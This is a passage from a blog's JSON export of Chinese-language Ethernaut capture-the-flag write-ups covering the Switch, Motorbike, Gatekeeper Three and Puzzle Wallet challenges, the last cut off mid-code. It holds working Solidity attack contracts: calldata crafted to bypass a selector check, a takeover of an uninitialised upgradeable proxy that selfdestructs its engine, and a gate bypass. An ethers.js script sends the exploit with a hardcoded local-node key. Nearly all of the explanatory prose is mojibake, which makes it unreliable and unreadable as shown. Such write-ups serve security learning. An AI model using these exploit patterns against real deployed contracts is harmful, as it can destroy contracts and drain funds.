4)çš„ç»“æœä¸å°±æ˜¯bytes4(keccak256(&quot;turnSwitchOff()&quot;))å—ï¼Œä½†æ˜¯å°±æ˜¯è°ƒç”¨å¤±è´¥ã€‚æ‰€ä»¥åªèƒ½å€ŸåŠ©etherjså‘é€åŸç”Ÿcalldataæ¥å®Œæˆã€‚ è°ƒç”¨æ–¹å¼ä¸ºï¼šé€šè¿‡å‘ç›®çš„åœ°å€å‘é€calldataï¼Œæ™ºèƒ½åˆçº¦å¯¹å…¶è§£ç ï¼Œè¦åšçš„æ˜¯ï¼šè°ƒç”¨flipSwitchå‡½æ•°ï¼ŒflipSwitchå‡½æ•°è°ƒç”¨turnSwitchOnå‡½æ•°ï¼Œæ‰€ä»¥å°±è¦å¯¹calldataè¿›è¡Œæ‹¼æ¥ã€‚ 123456789101112// è¿™æ˜¯flipSwitch()å‡½æ•°é€‰æ‹©å™¨30c13ade // 4bytes// onSelector çš„å­˜å‚¨ä½ç½® 0x00 0000000000000000000000000000000000000000000000000000000000000060 // 32+4 bytes// æ²¡ç”¨ï¼Œå•çº¯ä¸ºäº†å ä½ç½®0x20 0000000000000000000000000000000000000000000000000000000000000000 // 36+32 bytes// å­˜æ”¾ offSelector0x40 20606e1500000000000000000000000000000000000000000000000000000000 // 68+32bytes// è®°å½•é•¿åº¦0x60 0000000000000000000000000000000000000000000000000000000000000004 // å­˜æ”¾onSelector0x80 76227e1200000000000000000000000000000000000000000000000000000000 æ‰€ä»¥ï¼Œcalldataä¸ºï¼š0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000 å…¶å®ä¹Ÿå¯ä»¥ç”¨æ™ºèƒ½åˆçº¦å®Œæˆï¼š 123456789101112function attack() public &#123; // address(switch_).call(abi.encodeWithSelector(Switch.flipSwitch.selector, calCalldata())); // address(switch_).call(&quot;0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&quot;); address(switch_).call(abi.encodePacked( bytes4(0x30c13ade), bytes32(0x0000000000000000000000000000000000000000000000000000000000000060), bytes32(0x0000000000000000000000000000000000000000000000000000000000000000), bytes32(0x20606e1500000000000000000000000000000000000000000000000000000000), bytes32(0x0000000000000000000000000000000000000000000000000000000000000004), bytes32(0x76227e1200000000000000000000000000000000000000000000000000000000) ));&#125; ä¸”åªèƒ½ä»¥è¿™ç§æ–¹å¼è°ƒç”¨ã€‚ä¸èƒ½ç›´æ¥address(_switch).call(&quot;0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&quot;)ï¼Œæ„Ÿè§‰æ˜¯è§£ç ä¸äº†ã€‚ å‚è€ƒé“¾æ¥ï¼šhere 3. è§£é¢˜æ–¹æ³•ä¸€ï¼Œæ”»å‡»åˆçº¦ 12345678910111213141516171819contract Hack &#123; Switch switch_; constructor(address _switch) &#123; switch_ = Switch(_switch); &#125; function attack() public &#123; address(switch_).call(abi.encodePacked( bytes4(0x30c13ade), bytes32(0x0000000000000000000000000000000000000000000000000000000000000060), bytes32(0x0000000000000000000000000000000000000000000000000000000000000000), bytes32(0x20606e1500000000000000000000000000000000000000000000000000000000), bytes32(0x0000000000000000000000000000000000000000000000000000000000000004), bytes32(0x76227e1200000000000000000000000000000000000000000000000000000000) )); &#125;&#125; æ–¹æ³•äºŒï¼Œethersjsè„šæœ¬ 12345678910111213141516171819202122232425262728import &#123; ethers &#125; from &quot;ethers&quot;;const local_url = &quot;http://127.0.0.1:8545&quot;;const provider = new ethers.JsonRpcProvider(local_url);const privateKey = &quot;0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80&quot;;const wallet = new ethers.Wallet(privateKey, provider);const contract_address = &quot;0x5FbDB2315678afecb367f032d93F642f64180aa3&quot;;const data = &quot;0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&quot;;const tx = &#123; to: contract_address, data: data,&#125;;async function sendTransaction() &#123; try &#123; const result = await wallet.sendTransaction(tx); console.log(&quot;transaction success, the hash is =&gt;&quot;, result.hash); &#125; catch (error) &#123; console.error(&quot;transaction fail, the reason is &quot;, error); &#125;&#125;;sendTransaction(); ![image-20230909151052073](Switch &#x2F;image-20230909151052073.png)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Motorbike","slug":"CTFS/ethernaut/Motorbike","date":"2023-08-17T07:23:10.000Z","updated":"2023-08-17T07:23:10.000Z","comments":true,"path":"2023/08/17/CTFS/ethernaut/Motorbike/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/17/CTFS/ethernaut/Motorbike/","excerpt":"","text":"Motorbike1. é¢˜ç›®è¦æ±‚ 1.1 Ethernaut çš„æ‘©æ‰˜è½¦é‡‡ç”¨å…¨æ–°çš„å¯å‡çº§å‘åŠ¨æœºè®¾è®¡ã€‚ ä½ èƒ½å¯åŠ¨selfdestructå®ƒçš„å¼•æ“å¹¶ä½¿æ‘©æ‰˜è½¦æ— æ³•ä½¿ç”¨å—ï¼Ÿ å¯èƒ½æœ‰å¸®åŠ©çš„äº‹æƒ…ï¼š EIP-1967 UUPSå¯å‡çº§æ¨¡å¼ å¯åˆå§‹åŒ–åˆçº¦ 1.2 é¢˜ç›®ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104// SPDX-License-Identifier: MITpragma solidity &lt;0.7.0;import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;contract Motorbike &#123; // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; struct AddressSlot &#123; address value; &#125; // Initializes the upgradeable proxy with an initial implementation specified by `_logic`. constructor(address _logic) public &#123; require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;); _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic; (bool success,) = _logic.delegatecall( abi.encodeWithSignature(&quot;initialize()&quot;) ); require(success, &quot;Call failed&quot;); &#125; // Delegates the current call to `implementation`. function _delegate(address implementation) internal virtual &#123; // solhint-disable-next-line no-inline-assembly assembly &#123; calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) switch result case 0 &#123; revert(0, returndatasize()) &#125; default &#123; return(0, returndatasize()) &#125; &#125; &#125; // Fallback function that delegates calls to the address returned by `_implementation()`. // Will run if no other function in the contract matches the call data fallback () external payable virtual &#123; _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value); &#125; // Returns an `AddressSlot` with member `value` located at `slot`. function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123; assembly &#123; r_slot := slot &#125; &#125;&#125;contract Engine is Initializable &#123; // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; address public upgrader; uint256 public horsePower; struct AddressSlot &#123; address value; &#125; function initialize() external initializer &#123; horsePower = 1000; upgrader = msg.sender; &#125; // Upgrade the implementation of the proxy to `newImplementation` // subsequently execute the function call function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123; _authorizeUpgrade(); _upgradeToAndCall(newImplementation, data); &#125; // Restrict to upgrader role function _authorizeUpgrade() internal view &#123; require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;); &#125; // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call. function _upgradeToAndCall( address newImplementation, bytes memory data ) internal &#123; // Initial upgrade and setup call _setImplementation(newImplementation); if (data.length &gt; 0) &#123; (bool success,) = newImplementation.delegatecall(data); require(success, &quot;Call failed&quot;); &#125; &#125; // Stores a new address in the EIP1967 implementation slot. function _setImplementation(address newImplementation) private &#123; require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;); AddressSlot storage r; assembly &#123; r_slot := _IMPLEMENTATION_SLOT &#125; r.value = newImplementation; &#125;&#125; 2. åˆ†æ2.1 æœ¬é¢˜å’Œä¸Šé¢˜ç±»ä¼¼ï¼Œéƒ½æ˜¯ä»£ç†æ¨¡å¼çš„é¢˜ã€‚ç®€å•åˆ†æå¯çŸ¥ï¼ŒEngineæ˜¯Motorbikeçš„å®ç°ç±»ï¼ŒMotorbikeæ˜¯ä»£ç†åˆçº¦ï¼Œä¸¤è€…éƒ½æœ‰ bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;å˜é‡ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†é¿å…æ’æ§½å†²çªçš„é—®é¢˜ï¼Œè€Œä»£ç†åˆçº¦ä¸­é‡‡ç”¨äº†å†…è”æ±‡ç¼–çš„å½¢å¼ï¼Œè®¾ç½®å¹¶è¯»å–slot0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbcæ’æ§½çš„å€¼ã€‚ 2.2 å› ä¸ºä»£ç†åˆçº¦ä¸­é‡‡ç”¨çš„æ˜¯delegatecallçš„æ–¹å¼è¿›è¡Œï¼Œæ‰€ä»¥åœ¨ä»£ç†åˆçº¦ä¸­è°ƒç”¨é€»è¾‘åˆçº¦çš„åˆå§‹åŒ–å‡½æ•°ï¼Œå‡½æ•°è¿è¡Œçš„ç»“æœä½œç”¨å‘¢åœ¨ä»£ç†åˆçº¦ä¸­ï¼Œå³é€»è¾‘åˆçº¦ä¸­çš„å˜é‡ä»ç„¶ä¿æŒç€æœªåˆå§‹åŒ–çš„çŠ¶æ€ã€‚ 2.3 è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è‡ªå·±è°ƒç”¨åˆå§‹åŒ–å‡½æ•°ï¼Œè‡ªå®šä¹‰slot0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbcæ’æ§½çš„å€¼ã€‚åˆå› ä¸º_upgradeToAndCall()å‡½æ•°ï¼Œé‡‡ç”¨äº†delegatecallçš„å½¢å¼è¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œå…¶è¿è¡Œç»“æœä½œç”¨äºè‡ªèº«ï¼Œä¹Ÿå°±æ„å‘³ç€ï¼Œå¦‚æœå‡½æ•°ä¸­æœ‰selfdestructè‡ªæ¯å‡½æ•°çš„æ“ä½œï¼Œå…¶é€»è¾‘åˆçº¦ä¾¿ä¼šè¢«è‡ªæ¯ã€‚ 2.4 æ”»å‡»æ€è·¯ï¼Œéƒ¨ç½²ä¸€ä¸ªå…·æœ‰è‡ªæ¯åŠŸèƒ½çš„åˆçº¦ï¼Œè°ƒç”¨upgradeToAndCallå‡½æ•°è®¾ç½®æ–°çš„å®ç°åˆçº¦ï¼Œå¹¶æ‰§è¡Œè‡ªæ¯å‡½æ•°ã€‚ 3. è§£é¢˜æ”»å‡»åˆçº¦ 123456789101112131415161718192021222324contract Hack &#123; Engine engine; Helper helper; constructor(address _engine) public &#123; engine = Engine(_engine); helper = new Helper(); &#125; function attack() public &#123; engine.initialize(); engine.upgradeToAndCall( address(helper), abi.encodeWithSelector(Helper.kill.selector, msg.sender) ); &#125;&#125;contract Helper &#123; function kill(address payable to) public payable &#123; selfdestruct(to); &#125;&#125; åˆçº¦æŠ¥åºŸ","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Gatekeeper Three","slug":"CTFS/ethernaut/Gatekeeper Three","date":"2023-08-17T06:33:10.000Z","updated":"2023-08-17T06:33:10.000Z","comments":true,"path":"2023/08/17/CTFS/ethernaut/Gatekeeper Three/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/17/CTFS/ethernaut/Gatekeeper%20Three/","excerpt":"","text":"Gatekeeper Three1. é¢˜ç›®è¦æ±‚ 1.1 åº”å¯¹å¤§é—¨å¹¶æˆä¸ºè¿›å…¥è€…ã€‚ å¯èƒ½æœ‰å¸®åŠ©çš„äº‹æƒ…ï¼š è°ƒç”¨ä½çº§å‡½æ•°çš„è¿”å›å€¼ã€‚ æ³¨æ„è¯­ä¹‰ã€‚ åˆ·æ–°å­˜å‚¨åœ¨ä»¥å¤ªåŠä¸­çš„å·¥ä½œæ–¹å¼ 1.2 é¢˜ç›®ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract SimpleTrick &#123; GatekeeperThree public target; address public trick; uint private password = block.timestamp; constructor (address payable _target) &#123; target = GatekeeperThree(_target); &#125; function checkPassword(uint _password) public returns (bool) &#123; if (_password == password) &#123; return true; &#125; password = block.timestamp; return false; &#125; function trickInit() public &#123; trick = address(this); &#125; function trickyTrick() public &#123; if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123; target.getAllowance(password); &#125; &#125;&#125;contract GatekeeperThree &#123; address public owner; address public entrant; bool public allowEntrance; SimpleTrick public trick; function construct0r() public &#123; owner = msg.sender; &#125; modifier gateOne() &#123; require(msg.sender == owner); require(tx.origin != owner); _; &#125; modifier gateTwo() &#123; require(allowEntrance == true); _; &#125; modifier gateThree() &#123; if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123; _; &#125; &#125; function getAllowance(uint _password) public &#123; if (trick.checkPassword(_password)) &#123; allowEntrance = true; &#125; &#125; function createTrick() public &#123; trick = new SimpleTrick(payable(address(this))); trick.trickInit(); &#125; function enter() public gateOne gateTwo gateThree &#123; entrant = tx.origin; &#125; receive () external payable &#123;&#125;&#125; 2. åˆ†æ è§£è¯»GatekeeperThreeåˆçº¦ è¦æˆåŠŸæ³¨å†Œï¼Œåˆ™éœ€è¦æˆåŠŸè°ƒç”¨enterå‡½æ•°ï¼Œè€ŒæˆåŠŸè°ƒç”¨çš„å‰ææ˜¯ï¼Œé€šè¿‡ä¸‰ä¸ªâ€œå®ˆé—¨å‘˜â€ã€‚ gateOne()ï¼šå¾ˆç®€å•ï¼Œåªè¦è°ƒç”¨è€…ä¸æ˜¯EOAè´¦æˆ·å³å¯ï¼Œå†™ä¸€ä¸ªæ”»å‡»åˆçº¦å³å¯ã€‚ gateTwo() ï¼šrequire(allowEntrance == true)ï¼Œè¦æ±‚æˆåŠŸè°ƒç”¨getAllowanceå‡½æ•°ï¼Œè¿™è¦æ±‚çŒœå¯¹SimpleTrickä¸­çš„å¯†ç ï¼Œæ™ºèƒ½åˆçº¦æ˜¯å…¬å¼€åŒåçš„ï¼Œå¯ä»¥é€šè¿‡è„šæœ¬æ¥è·å–æ™ºèƒ½åˆçº¦ä¸Šç§æœ‰å˜é‡çš„å€¼ã€‚ 12345678910111213it(&quot;Execution&quot;, async function() &#123; let three_contract = await (await ethers.getContractFactory(&#x27;GatekeeperThree&#x27;, deployer)).deploy(); await three_contract.connect(player); // await three_contract.createTrick(); // 0x0A49D6c8267b21A7cB670fD7544448B76Bfb822b // console.log(&quot;trick = &quot;, await three_contract.trick()); let slot2 = await ethers.provider.getStorage(&quot;0x0A49D6c8267b21A7cB670fD7544448B76Bfb822b&quot;, 2); console.log(`slot2 = $&#123;slot2&#125;`);&#125;); å¯ä»¥å€ŸåŠ©è„šæœ¬è·å–æ™ºèƒ½åˆçº¦ä¸Šçš„å¯†ç  gateThree()ï¼šå¾€åˆçº¦ä¸­è½¬å…¥å¤§äº0.001etherçš„ETHï¼Œä¸”åœ¨æ”»å‡»åˆçº¦ä¸­ä½¿å¾—å›è°ƒå‡½æ•°è¿”å›çš„å€¼ä¸ºfalseå³å¯ã€‚ 3. è§£é¢˜ç»¼ä¸Šï¼Œå¯æœ‰æ”»å‡»åˆçº¦ 12345678910111213141516171819202122232425contract Hack &#123; GatekeeperThree three; SimpleTrick trick; constructor(address payable _three) &#123; three = GatekeeperThree(_three); three.createTrick(); trick = three.trick(); &#125; function attck(uint password) public payable &#123; three.construct0r(); three.getAllowance(password); payable(address(three)).transfer(0.0011 ether); three.enter(); require(three.entrant() == msg.sender, &quot;you are not entering&quot;); &#125; receive() external payable &#123; if (msg.value == 0.001 ether) &#123; revert(); &#125; &#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Puzzle Wallet","slug":"CTFS/ethernaut/Puzzle Wallet","date":"2023-08-16T04:10:10.000Z","updated":"2023-08-16T04:10:10.000Z","comments":true,"path":"2023/08/16/CTFS/ethernaut/Puzzle Wallet/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/16/CTFS/ethernaut/Puzzle%20Wallet/","excerpt":"","text":"Puzzle Wallet1. é¢˜ç›®è¦æ±‚ é¢˜ç›®è¦æ±‚ï¼šæˆä¸ºä»£ç†åˆçº¦ä¸­çš„ç®¡ç†è€…ï¼Œå³æˆä¸ºPuzzleProxyåˆçº¦ä¸­çš„adminã€‚ é¢˜ç›®ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990// SPDX-License-Identifier: MITpragma solidity ^0.8.0;pragma experimental ABIEncoderV2;import &quot;../helpers/UpgradeableProxy-08.sol&quot;;contract PuzzleProxy is UpgradeableProxy &#123; address public pendingAdmin; address public admin; constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123; admin = _admin; &#125; modifier onlyAdmin &#123; require(msg.sender == admin, &quot;Caller is not the admin&quot;); _; &#125; function proposeNewAdmin(address _newAdmin) external &#123; pendingAdmin = _newAdmin; &#125; function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123; require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;); admin = pendingAdmin; &#125; function upgradeTo(address _newImplementation) external onlyAdmin &#123; _upgradeTo(_newImplementation); &#125;&#125;contract PuzzleWallet &#123; address public owner; uint256 public maxBalance; mapping(address =&gt; bool) public whitelisted; mapping(address =&gt; uint256) public balances; function init(uint256 _maxBalance) public &#123; require(maxBalance == 0, &quot;Already initialized&quot;); maxBalance = _maxBalance; owner = msg.sender; &#125; modifier onlyWhitelisted &#123; require(whitelisted[msg.sender], &quot;Not whitelisted&quot;); _; &#125; function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123; require(address(this).balance == 0, &quot;Contract balance is not 0&quot;); maxBalance = _maxBalance; &#125; function addToWhitelist(address addr) external &#123; require(msg.sender == owner, &quot;Not the owner&quot;); whitelisted[addr] = true; &#125; function deposit() external payable onlyWhitelisted &#123; require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;); balances[msg.sender] += msg.value; &#125; function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123; require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;); balances[msg.sender] -= value; (bool success, ) = to.call&#123; value: value &#125;(data); require(success, &quot;Execution failed&quot;); &#125; function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123; bool depositCalled = false; for (uint256 i = 0; i &lt; data.length; i++) &#123; bytes memory _data = data[i]; bytes4 selector; assembly &#123; selector := mload(add(_data, 32)) &#125; if (selector == this.deposit.selector) &#123; require(!depositCalled, &quot;Deposit can only be called once&quot;); // Protect against reusing msg.value depositCalled = true; &#125; (bool success, ) = address(this).delegatecall(data[i]); require(success, &quot;Error while delegating call&quot;); &#125; &#125;&#125; 2. åˆ†æ2.1 è¿™æ˜¯ä¸€é“æ¶‰åŠåˆ°ä»£ç†åˆçº¦çš„é¢˜ã€‚æœ¬è´¨ä¸Šproxyåˆçº¦æœ€ä¸»è¦çš„å‡½æ•°ä¸ºï¼Œå›è°ƒå‡½æ•°ï¼Œè¯¥å›è°ƒå‡½æ•°é‡‡ç”¨äº†å†…è”æ±‡ç¼–çš„æ–¹å¼æ¥å®ç°ï¼Œæå¤§çš„æé«˜çš„ä»£ç çš„æ‰©å®¹æ€§ã€‚å…¶é‡‡ç”¨çš„æ˜¯delegatecallçš„æ–¹å¼è¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œå› ä¸ºå…¶è°ƒç”¨æ–¹å¼ï¼Œæ‰€ä»¥é€»è¾‘åˆçº¦ä¸­æ“ä½œçš„æ•°æ®æ˜¯ä»ä»£ç†åˆçº¦ä¸­è·å–ã€‚ 2.2 æœ‰æ®µæ—¶é—´æ²¡ç¢°ä»£ç†åˆçº¦äº†ï¼Œæœ‰ç‚¹ç»†èŠ‚è¿˜æ˜¯è¦æ³¨æ„çš„ã€‚å°±æ¯”å¦‚é‡‡ç”¨delegatecallçš„è°ƒç”¨æ–¹å¼ï¼Œå…¶ä»£ç ä¼šè¢«å¤åˆ¶åˆ°ä»£ç†åˆçº¦ä¸­ï¼Œå°±æ¯”å¦‚è¿™é‡Œï¼Œæˆ‘ä½†æ˜¯æ‡µäº†ä¸€ä¼šã€‚ è¿™é‡Œæˆ‘æ˜¯æ¨¡æ‹Ÿé¢˜ç›®ï¼Œæˆ‘ä»¥ownerçš„èº«ä»½å°†æŒ‡å®šçš„åœ°å€åŠ å…¥åˆ°ç™½åå•ï¼Œåœ¨PuzzleWalletä¸­æŸ¥çœ‹è¯¥åœ°å€æ˜¯å¦è¢«åˆ—å…¥ç™½åå•ï¼Œç»“æœæ˜¯æ˜¾ç¤ºtrueï¼Œä½†æ˜¯æˆ‘é€šè¿‡ç›´æ¥å‘é€calldataçš„å½¢å¼ï¼Œè§¦å‘ä»£ç†åˆçº¦çš„å›è°ƒå‡½æ•°ï¼Œç»“æœæ˜¾ç¤ºå…¶æœªè¢«åˆ—å…¥ç™½åå•ã€‚æˆ‘å½“æ—¶æƒ³äº†å¥½ä¹…ï¼ŒåŸæ¥æ˜¯å› ä¸ºï¼Œåœ¨ä»£ç†åˆçº¦ä¸­ï¼Œè¿™äº›æ“ä½œä¸åœ¨ä»£ç†åˆçº¦ä¸­æ‰§è¡Œè¿‡ï¼Œå³è¯¥åœ°å€åœ¨ä»£ç†åˆçº¦ä¸­æœªè¢«è®°å½•ï¼Œæ‰€ä»¥å…¶è¿”å›å€¼ä¸ºfalseã€‚æ‰€ä»¥åªèƒ½åœ¨ä»£ç†åˆçº¦ä¸­æ‰§è¡ŒåŠ å…¥ç™½åå•æ‰è¡Œã€‚ 2.3 åˆæœ‰ï¼Œè¯¥é¢˜æœ€æœ¬è´¨çš„æ¼æ´åœ¨äºï¼Œ***æ’æ§½å†²çª***ã€‚è€Œä¸”ï¼Œä»£ç†æ¨¡å¼è¯»å–çš„æ•°æ®æ˜¯ä»£ç†åˆçº¦ä¸­çš„å˜é‡ï¼Œè¿™ä¸€è¡Œä¸ºæ„å‘³ç€ï¼Œé€»è¾‘åˆçº¦ä¸­çš„ä¸€äº›æ–­è¨€ï¼Œæ¯”å¦‚require(msg.sender == owner, &quot;Not the owner&quot;);å°†ä¸ä¸é€»è¾‘åˆçº¦æœ‰å…³ç³»ï¼Œå…¶ownerçš„å€¼ï¼Œå®é™…ä¸Šæ˜¯ä»£ç†åˆçº¦pendingAdminçš„å€¼ï¼Œåªè¦é€šè¿‡proposeNewAdmin()å°±å¯ä»¥æˆä¸ºé’±åŒ…çš„æ‰€æœ‰è€…ï¼Œå¯ä»¥æ“ä½œé’±åŒ…ï¼ˆé€»è¾‘åˆçº¦ï¼‰ã€‚ 2.4 åŒç†ï¼Œåªæœ‰ä¿®æ”¹é€»è¾‘åˆçº¦ä¸­çš„å˜é‡ï¼Œä¾¿ä¼šåä½œç”¨äºä»£ç†åˆçº¦ã€‚å³è°ƒç”¨setMaxBalance()å‡½æ•°ï¼Œæ˜é¢ä¸Šæ˜¯ä¿®æ”¹maxBalanceå®é™…ä¸Šæ˜¯ä¿®æ”¹PuzzleProxy adminçš„å€¼ã€‚ 2.5 æ‰€ä»¥æœ¬é¢˜å…³é”®åœ¨äºï¼ŒæˆåŠŸè°ƒç”¨setMaxBalance() 1234function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123; require(address(this).balance == 0, &quot;Contract balance is not 0&quot;); maxBalance = _maxBalance;&#125; onlyWhitelistedä¿®é¥°å™¨ï¼Œæˆ‘å·²ç»æœ‰åŠæ³•æˆä¸ºé’±åŒ…çš„æ‰€æœ‰è€…ï¼Œå¯ä»¥å°†æŸä¸€åœ°å€æ·»åŠ åˆ°ç™½åå•ä¹‹ä¸­ã€‚æœ€ä¸»è¦çš„æ˜¯é€šè¿‡æ–­è¨€require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);ã€‚å› ä¸ºåœ¨PuzzleProxy åˆçº¦ä¸­æœ‰0.001etheræ‰€ä»¥è¦æƒ³åŠæ³•å°†é’±å–å‡ºæ¥ã€‚ 2.6 å¦‚æœæ˜¯æ­£å¸¸æŒ‰ç…§executeè¿›è¡Œå–é’±çš„è¯ï¼Œæ˜¯ä¸å¯èƒ½å°†åˆçº¦çš„ä½™é¢ç½®ç©ºçš„ã€‚è€Œmulticallå‡½æ•°ä¾¿å¯ä»¥å®ç°ï¼Œè¯¥å‡½æ•°æœ‰ä¸€ä¸ªæ¼æ´ï¼Œä¾¿æ˜¯ä¸æ£€æŸ¥è‡ªèº«å‡½æ•°çš„è°ƒç”¨ï¼Œå› ä¸ºåˆ¤æ–­åˆ¤æ–­æ¡ä»¶ä¸ºå±€éƒ¨å˜é‡ï¼Œè€Œä¿®æ”¹çš„balancesæ˜ å°„åˆ™æ˜¯æˆå‘˜å˜é‡ï¼Œæ¯å½“è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œä¾¿ä¼šå¼€è¾Ÿä¸€ä¸ªæ–°çš„å†…å­˜ç©ºé—´ï¼ˆä»¥æ ˆçš„å½¢å¼ï¼‰ï¼Œæ­¤æ—¶å‡½æ•°ä½“ä¸­çš„å±€éƒ¨å˜é‡å°±ä¼šæ¢å¤æˆé»˜è®¤å€¼ã€‚è¿™å°±æ˜¯æ¼æ´æ‰€åœ¨ï¼Œå› ä¸ºå‡½æ•°æ£€æŸ¥ä¸èƒ½å¤šæ¬¡è°ƒç”¨deposit()ï¼Œä»¥depositCalled è¯¥å˜é‡è¿›è¡Œåˆ¤æ–­ï¼Œåªè¦è¿›è¡Œè‡ªèº«è°ƒç”¨ï¼Œå³ä½¿ä¹‹å‰æ‰§è¡Œè¿‡deposit()å‡½æ•°ï¼Œä½†åœ¨æ–°Â·å¼€è¾Ÿçš„å†…å­˜ç©ºé—´ä¸­ï¼Œè¯¥å€¼è¿˜æ˜¯falseï¼Œè€Œä¸”ä»–ä»¬ä¿®æ”¹çš„å€¼éƒ½æ˜¯æˆå‘˜å˜é‡ï¼Œè¿™æ„å‘³ç€ï¼Œå¯ä»¥ç®€å•çš„å®ç°ï¼šå­˜ä¸€å–å¤šã€‚ é€šè¿‡ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹éªŒè¯çŒœæƒ³ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687contract Proxy &#123; mapping(address =&gt; uint256) public balances; address public implementation; constructor(address implementation_)&#123; implementation = implementation_; &#125; fallback() external payable &#123; address _implementation = implementation; assembly &#123; calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) switch result case 0 &#123; revert(0, returndatasize()) &#125; default &#123; return(0, returndatasize()) &#125; &#125; &#125;&#125;contract PuzzleWallet &#123; mapping(address =&gt; uint256) public balances; function deposit() external payable &#123; require(address(this).balance &lt;= 1 ether, &quot;Max balance reached&quot;); balances[msg.sender] += msg.value; &#125; function multicall(bytes[] calldata data) external payable &#123; bool depositCalled = false; for (uint256 i = 0; i &lt; data.length; i++) &#123; bytes memory _data = data[i]; bytes4 selector; assembly &#123; selector := mload(add(_data, 32)) &#125; if (selector == this.deposit.selector) &#123; require(!depositCalled, &quot;Deposit can only be called once&quot;); // Protect against reusing 